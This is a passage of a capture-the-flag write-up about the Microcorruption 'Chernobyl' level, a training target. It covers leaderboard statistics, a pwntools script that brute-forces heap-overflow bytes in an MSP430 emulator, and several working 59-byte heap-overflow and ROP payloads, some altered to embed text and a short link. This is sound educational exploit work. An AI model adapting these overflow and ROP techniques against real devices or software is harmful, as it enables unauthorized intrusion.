        <caption>Chernobyl Exploit Size Leaderboard: July 2022</caption>
        <thead>
          <tr>
            <th>Position</th>
            <th>Username</th>
            <th>Exploit Size (Bytes)</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>1st</code></td>
		  <td><code>ThatsMe</code></td>
		  <td><code>59</code></td>
          </tr>
          <tr>
		  <td><code>2nd</code></td>
		  <td><code><mark>b9ek</mark></code></td>
		  <td><code><mark>59</mark></code></td>
          </tr>
        </tbody>
      </table>

      <p>As of May 2022, there were 86,487 users on the <a href="https://web.archive.org/web/20220513195347/https://microcorruption.com/hall_of_fame/progress">leaderboard</a>.</p>

<br>
      <figure>
        <img src="./images/chernobyl/microcorruption-overall-progress.png"
          loading="eager" alt="Overall level progress." />
      </figure>

<h3>Concerning The Calculation Of Rankings</h3>

<p>The first "challenge" in the series, with 51,203 solves, is a guided tutorial. The second one, with 29,872 solves, involves extracting a hard-coded plaintext password by analyzing defined strings in the firmware. Given that the latter is the first one that requires even a modicum of technical skill, it is fair to say that it is the first "real" challenge in the series.</p>

<p>These challenges were hosted as a CTF and remained online for eight years afterward. The early contestants were highly motivated to finish the entire set quickly, but a certain amount of "motivational drift" probably occurred over the years, resulting in relatively more people quitting partway through. This trend skewed the numbers over time and is a bias for which to account.</p>

<h4>Conservative Numbers</h4>
<p>Properly speaking, there were 29,872 contenders. In May 2022, the top 2.6% of them had completed Chernobyl. The following is the earliest leaderboard data available, preserved as a snapshot on the Wayback Machine in <a href="https://web.archive.org/web/20160414044337/https://microcorruption.com/hall_of_fame/progress">April 2016</a>.</p>

    <br>
      <figure>
        <img src="./images/algiers/microcorruption-overall-progress-historical.png"
          loading="eager" alt="Overall level progress for Microcorruption, circa April, 2016." />
      </figure>

      <p>At that point, writing a working exploit for Chernobyl put someone in the top 3.95% of the earlier, ostensibly more driven population. Projecting forward: if 788 people wrote Chernobyl exploits as of May 2022, and those people are assumed to constitute 3.95% of the significant competition, that implies there are 19,922 serious competitors. If two 59-byte Chernobyl exploits exist, each progenitor is 1 in 9,961.</p>

<h2>Outside Corroboration</h2>

<p>The Microcorruption input size leaderboards are no longer available due to a backend change that removed them in May 2022.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	If anyone from NCC Group is reading this, yours truly would appreciate a public archive of the historical challenge leaderboard data. 
</span>


There are no Wayback Machine snapshots from before this due to authentication requirements to view the pages. However, outside sources support the conclusion that only a minuscule population authored exploits of this length.</p>

<blockquote>
	Looking at the hall of fame, the minimum input required is only 60 bytes!
<br>
<cite>— <a href="https://web.archive.org/web/20201015013756/https://zijunh.github.io/2019/02/chernobyl/">Zijun Hui</a>, 2019</cite>
</blockquote>

<p>The above excerpt is from a blog post pushed to <a href="https://github.com/ZijunH/zijunh.github.io/blob/d2d489af18eb41670ad469738b2e72794b1212e2/2019/02/chernobyl/index.html">Github.io</a> in February 2019. It is reasonable to suspect, between early 2019 and mid-2022, that a handful of people might have beaten the sixty-byte record. In reality, two such instances exist—of which this is the second.</p>

<h2>Going For Broke: Fifty-Eight Bytes</h2>

<p>The following section is nonessential. In short, the 59-byte exploit works by pure coincidence. The creation of an exploit any more constrained verges on impossible. A few approaches, taken by yours truly, nonetheless sought to achieve as much.</p>

<p>The avenues considered were as follows.</p>

<ol>
	<li>Fool the implementation into adding a second null account, shortening the exploit by four bytes.</li>
	<li>Use a random write to corrupt an integer array tracking username counts for each bucket, causing <code>rehash</code> to run until heap exhaustion—a strategy that theoretically could have achieved multiple writes, albeit less accurate ones.</li>
	<li>Assume a three-byte overflow exists that can coincidentally trigger the unlock interrupt and automate the process of brute-forcing the possible execution paths.</li>
</ol>

<p>Details are omitted for brevity, as none of these approaches ultimately resulted in a viable exploit. The code and setup intstuctions for the custom tool used to bruteforce execution paths can be found below.</p>

<br>
<ul id="nav">
  <li><a href="#bruteforce-tool">Execution Path Bruteforce Tool</a></li>
</ul>

<div id="slides">
  <section id="bruteforce-tool">

<h3>Bruteforcing Execution Paths</h3>

<p>There are only three bytes of search space, and the firmware is entirely deterministic. Even with a slow emulator, there are only 16,777,216 possible execution paths. The code will brute-force all possible combinations for these bytes.</p>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000<mark>??????</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00704d7f
</code></pre>

<p>A C-based third-party emulator executes the firmware, and a pwntools script wraps it. The environment setup is as follows on a Debian system.</p>

<pre><code>sudo apt update
sudo apt install build-essential libglib2.0-0 libglib2.0-dev python3-pip
sudo pip3 install pwntools
git clone --depth 1 https://github.com/cemeyer/msp430-emu-uctf
cd ./msp430-emu-uctf/
make
cd ..
</code></pre>

<p>The source code for the script to perform the brute-force is below.</p>

<pre><code>#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from hash_username import hash_username

context.update(arch=&apos;msp430&apos;)

# Path for emulator
exe = &apos;./msp430-emu-uctf/msp430-emu&apos;

gdbscript = &apos;&apos;&apos;
continue
&apos;&apos;&apos;.format(**locals())


# Padding for heap overflow
stage1 = [
        &apos;6e000000f0&apos;,
        &apos;6e000000e0&apos;,
        &apos;6e000000d0&apos;,
        &apos;6e000000c0&apos;,
        &apos;6e000000b0&apos;
        ]

# Rehash accounts and ROP chain
stage3 = [
        &apos;6e000000aa&apos;,
        &apos;6e000000bb&apos;,
        &apos;6e000000cc&apos;,
        &apos;6e000000dd&apos;,
        &apos;6e&apos;,
        &apos;6e00704d7f&apos;
        ]


def start(argv=[&apos;./chernobyl.bin&apos;], *a, **kw):
    &apos;&apos;&apos;Start the exploit against the target.&apos;&apos;&apos;
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def send_stage(stage, io):
    for line in stage:
        try:
            io.recvuntil((&quot;Gets (&apos;:&apos;-prefix for hex)&gt; &quot;).encode(&apos;utf-8&apos;), timeout=2)
        except EOFError:
            print(&quot;EOFError!&quot;)
            exit()
        io.sendline((&apos;:&apos; + line).encode(&apos;utf-8&apos;))
    return io


def run_exploit(overflow_command):
        raw_overflow_command = overflow_command
        overflow_command = [overflow_command]

        io = start()
        io = send_stage(stage1, io)
        io = send_stage(overflow_command, io)
        io = send_stage(stage3, io)

        io.recvline(timeout=2)

        result = io.recv(2**16, timeout=0.25)

        io.close()
        io.kill()

        print(result)

        if result.find(b&apos;The lock opens; you win!&apos;) != -1:
            return True
        else:
            return False


def generate_bk(func):
    def craft_bk(addr_range, *args):
        for address in range(addr_range[0], addr_range[1]+1, 2):
            # Swap endianness for address to be sent as back pointer
            address_str = format(address, &apos;04x&apos;)
            bk = address_str[2:4] + address_str[0:2]

            func(bk, *args)

    return craft_bk


def check_and_run(overflow):
        if hash_username(overflow.encode()) % 8 == 0:
                status = run_exploit(&apos;6e000000&apos; + overflow)
                if status == True:
                        with open(&apos;candidates.txt&apos;, &apos;a&apos;) as f:
                                f.write(overflow + &apos;\n&apos;)


@generate_bk
def overflow_short(bk):
	print(bk)
	check_and_run(bk)


@generate_bk
def overflow_long(bk, fd_range):
        for fd_byte in range(fd_range[&quot;Min&quot;], fd_range[&quot;Max&quot;], 2):
                overflow = bk + format(fd_byte, &apos;02x&apos;)

                print(overflow)
                check_and_run(overflow)


def bruteforce():

    memory_ranges = [
    (0x0000, 0x0030),
    (0x0150, 0x0170),
    (0x2400, 0x2420),
    (0x3d00, 0x3e00),
    (0x4300, 0x5400),
    (0xff00, 0xffff)
    ]
    
    fd_range = {&quot;Min&quot;: int(&apos;EA&apos;, 16), &quot;Max&quot;: int(&apos;FF&apos;, 16)}

    for i in memory_ranges:
        overflow_short(i)

    for i in memory_ranges:
        overflow_long(i, fd_range)
</code></pre>

<h4>Narrowing The Search Space</h4>

<p>Astute readers may notice that the above code does not search all the 1.67 million possible execution paths. This choice is not worth dissecting, but suffice it to say that certain <em>a priori</em> constraints reduce the number of paths.</p>

<p>Invoke the <code>bruteforce</code> function as follows.</p>

<pre><code>$ python3 -i bruteforce.py 
&gt;&gt;&gt; bruteforce()
</code></pre>

<h3>Alternate Solutions</h3>

<p>While this tool does not find any working fifty-eight byte exploits, there are at least two other valid fifty-nine byte ones.</p>

<pre><code>for i in range(0x0000, 0xFFFF):
    fd = binascii.hexlify(i.to_bytes(2, "big")).decode()
    check_and_run('e63d' + fd)
</code></pre>

<pre><code>$ cat candidates.txt
e63d<mark>3a53</mark>
e63d5851
e63d<mark>b851</mark>
</code></pre>

<p><b>Chronology note:</b> The original forward pointer (<code>0x5158</code>) was discovered via manual analysis rather than bruteforcing; the above script was written afterward.</p>


<h3>Conclusion</h3>

<p>Barring a significant breakthrough in understanding, crafting a 58-byte exploit and beating the record seems impossible. It is possible to continue to optimize using more advanced techniques like memory snapshots or symbolic execution, but this would require more advanced tooling. As it stands, this may be the limit of what any <em>sane</em> individual can accomplish.</p>

  </section>
</div>

<h2>Leaderboard Meta Code Golf</h2>

<p>While it may or may not be possible to beat the record, a different kind of world first is within reach.</p>

<br>
<br>
<center>
      <figure>
        <img src="./images/meta-analysis.png"
          loading="eager" alt="Overall level progress." />
	<figcaption><a href="https://xkcd.com/1447/">XKCD: Meta-Analysis</a></figcaption>
      </figure>
      </center>

<br>

<p>There are only a few bytes that are critical to the functioning of this exploit.</p>

<pre><code>6e000000<mark>f0</mark>
6e000000<mark>e0</mark>
6e000000<mark>d0</mark>
6e000000<mark>c0</mark>
6e000000<mark>b0</mark>
6e000000<mark>e63d5851</mark>
6e000000aa
6e000000bb
6e000000cc
6e000000dd
6e
6e00<mark>704d7f</mark>
</code></pre>

<p>Everything else is replaceable with arbitrary values.</p>

<h3>Symbolism</h3>

<p>It is possible to insert arbitrary values for the trailing rehash account usernames. It is impossible to encode "1337" because of the repeating threes—due to their treatment as duplicate accounts—but "0539" is feasible.</p>

<pre><code>&gt;&gt;&gt; binascii.hexlify(b&quot;0539&quot;)
b&apos;<mark>30353339</mark>&apos;</code></pre>

<pre><code>6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000b0
6e000000e63d5851
6e000000<mark>30</mark>
6e000000<mark>35</mark>
6e000000<mark>33</mark>
6e000000<mark>39</mark>
6e
6e00704d7f
</code></pre>

<p>It is also possible to fit a short pseudonym or handle with some rearranging.</p>

<pre><code>&gt;&gt;&gt; binascii.hexlify(b&quot;Every&quot;)
b&apos;<mark>4576657279</mark>&apos;
</code></pre>

<pre><code>6e
6e000000f0
6e000000e0
6e000000d0
6e000000c0
6e000000e63d5851
6e000000<mark>45</mark>
6e000000<mark>76</mark>
6e000000<mark>65</mark>
6e000000<mark>72</mark>
6e000000<mark>79</mark>
6e00704d7f
</code></pre>

<h3>This Exploit Links Its Own Writeup</h3>

<p>The firmware only parses the first character of each command, allowing the substitution of nulls in place of the middle bytes. Given a sufficiently short URL, it is possible to embed a link to this writeup in the middle of the exploit without breaking it.</p>

<pre><code>&gt;&gt;&gt; binascii.hexlify(b&quot;is.gd/muzap&quot;)
b&apos;<mark>69732e67642f6d757a6170</mark>&apos;
&gt;&gt;&gt;</code></pre>

<pre><code>6e
6e00<mark>69</mark>00f0
6e00<mark>73</mark>00e0
6e00<mark>2e</mark>00d0
6e00<mark>67</mark>00c0
6e00<mark>64</mark>00e63d5851
6e00<mark>2f</mark>0045
6e00<mark>6d</mark>0076
6e00<mark>75</mark>0065
6e00<mark>7a</mark>0072
6e00<mark>61</mark>0079
6e00<mark>70</mark>4d7f
</code></pre>

<p>The last character in the short link URL is the same as the least significant byte of the payload ROP gadget address—coincidentally, a printable alphanumeric. This hack allows the URL to overlap the gadget.</p>

<h3>A Different Kind Of Record</h3>

<p>As long as the data is small enough, it is possible to use the above techniques to encode arbitrary information.</p>

<blockquote>
We choose to go to the Moon in this decade and do the other things, not because they are easy, but because they are hard; because that goal will serve to organize and measure the best of our energies and skills, because that challenge is one that we are willing to accept, one we are unwilling to postpone, and one we intend to win.
<br>
<cite>— John F. Kennedy</cite>
</blockquote>

<pre><code>6e
6e006200f0
6e003900e0
6e006500d0
6e006b00c0
6e004000e63d5851
6e00700045
6e006d0076
6e002e0065
6e006d0072
6e00650079
6e002e4d7f
</code></pre>

<p>While beating the record outright would have been preferable, there is still something to show for the effort. There is exactly one copy of <em>this</em> exploit on Earth.</p>

</body>
